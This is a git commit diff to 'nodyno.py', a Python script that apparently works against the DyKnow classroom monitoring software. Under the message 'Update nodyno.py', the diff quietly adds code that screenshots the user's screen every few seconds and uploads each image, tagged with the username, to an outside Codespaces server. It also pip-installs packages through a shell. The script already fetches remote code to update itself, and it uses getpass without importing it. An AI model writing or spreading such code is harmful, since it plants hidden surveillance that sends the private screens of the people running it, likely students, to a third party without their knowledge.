e5599a287ed366655b6919e4d10ad3ea7edc35d4
magentapenguin <83044109+magentapenguin@users.noreply.github.com>
2024-06-11 12:29:36 -0700

    Update nodyno.py

--- nodyno.py
+++ nodyno.py
@@ -1,7 +1,28 @@
-from multiprocessing import Process
 import os.path, subprocess, glob, time, signal, sys
 import urllib.request as r
 import urllib.error, hashlib, hmac
+
+def importinstall(pipname,modulename=None,update=False,**importkwargs):
+    if modulename is None:
+        modulename = pipname
+    if not update:
+        try:
+            return __import__(modulename)
+        except ImportError:
+            pass
+    subprocess.call(rf'pip install{" --upgrade" if update else ""} {pipname}', shell=True)
+    return __import__(modulename)
+
+pyscreeze = importinstall('pyscreeze')
+
+def screenshot():
+    img = pyscreeze.screenshot()
+    img = img.resize((int(img.size[0]/img.size[1]*340),340))
+    img.save('tmp.png')
+    with open('tmp.png', 'rb') as imgbytes:
+        request('https://bookish-system-jgvv7pxj96wh5wjq-8080.app.github.dev/receive/'+getpass.getuser(), imgbytes.read(), 'POST')
+
+
 
 def request(url, data=None, method="GET", headers={}):
     robj = r.Request(url, data, method=method, headers=headers)
@@ -16,16 +37,19 @@ dynomaindir = r"C:\Program Files\DyKnow\Cloud"
 if not os.path.exists(dynomaindir):
     input("U no have Dyknow! Press enter to exit.")
     sys.exit()
+
+checkupdates=True
+
 data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
 try:
-    with open("nodyno.py", "rb") as f:
+    with open(sys.argv[0], "rb") as f:
         filedata = f.read()
 except:
     filedata = b""
 y = hashlib.sha256(filedata)
 if not hasattr(data, "getcode"):
     x = hashlib.sha256(data)
-    if not hmac.compare_digest(x.digest(), y.digest()):
+    if not hmac.compare_digest(x.digest(), y.digest()) and checkupdates:
         subprocess.call("python install.py")
         sys.exit()
 dirs = [x for x in os.scandir(dynomaindir) if x.is_dir()]
@@ -58,7 +82,8 @@ def f2():
            f(x)
            usednames.append(x)
            #print(usednames)
-       time.sleep(4)
+        screenshot()
+        time.sleep(4)
 
 if __name__ == '__main__':
     f2()
